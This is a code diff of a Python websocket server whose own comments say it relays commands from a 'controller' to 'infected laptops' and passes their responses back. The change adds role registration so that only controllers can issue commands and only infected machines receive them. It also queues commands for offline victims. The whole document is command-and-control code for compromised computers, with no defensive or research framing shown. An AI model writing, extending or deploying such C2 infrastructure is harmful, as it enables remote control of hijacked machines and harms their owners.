@@ -19,28 +19,28 @@ def cleanup_old_messages():
     print(f"[DEBUG] Cleaned up messages. Remaining messages: {len(messages)}")
 
 # Assign a unique ID to each new connection
-async def register_client(websocket):
-    client_id = str(uuid.uuid4())
+async def register_client(websocket, role, client_id):
     clients[client_id] = {
         'websocket': websocket,
         'last_seen': datetime.now(),
+        'role': role,  # Store the role (controller or infected)
         'messages': []  # For storing unsent messages
     }
-    print(f"[DEBUG] Registered new client: {client_id}")
+    print(f"[DEBUG] Registered new {role}: {client_id}")
     return client_id
 
 # Relay messages between control and infected laptops
-async def relay_messages(websocket, client_id):
+async def relay_messages(websocket, client_id, role):
     while True:
         try:
             # Receive message from the client
             message = await websocket.recv()
             data = json.loads(message)
-            print(f"[DEBUG] Received message from {client_id}: {data}")
+            print(f"[DEBUG] Received message from {client_id} ({role}): {data}")
 
             cleanup_old_messages()  # Clean up old messages before processing new ones
             
-            if data.get("type") == "command":
+            if data.get("type") == "command" and role == "controller":
                 # Controller sends a command to an infected laptop
                 target_id = data['target']
                 command = data['command']
@@ -48,7 +48,7 @@ async def relay_messages(websocket, client_id):
 
                 print(f"[DEBUG] Processing command for target {target_id}: {command}")
 
-                if target_id in clients:
+                if target_id in clients and clients[target_id]['role'] == 'infected':
                     target_ws = clients[target_id]['websocket']
                     command_id = str(uuid.uuid4())
                     command_time = datetime.now()
@@ -74,7 +74,7 @@ async def relay_messages(websocket, client_id):
                     clients[client_id]['messages'].append(data)
                     print(f"[DEBUG] Client {target_id} is not connected. Command queued.")
 
-            elif data.get("type") == "response":
+            elif data.get("type") == "response" and role == "infected":
                 # Infected laptop sends a response back to the controller
                 command_id = data['command_id']
                 response = data['response']
@@ -105,11 +105,18 @@ async def relay_messages(websocket, client_id):
 
 # Handle new connections
 async def connection_handler(websocket, path):
-    client_id = await register_client(websocket)
-    print(f"[DEBUG] New client connected: {client_id}")
+    # First message must specify the role and client ID
+    initial_message = await websocket.recv()
+    initial_data = json.loads(initial_message)
+
+    role = initial_data['role']
+    client_id = initial_data['id']
+
+    await register_client(websocket, role, client_id)
+    print(f"[DEBUG] New {role} connected: {client_id}")
 
     try:
-        await relay_messages(websocket, client_id)
+        await relay_messages(websocket, client_id, role)
     except websockets.ConnectionClosed:
         print(f"[DEBUG] Connection closed for client: {client_id}")
         del clients[client_id]
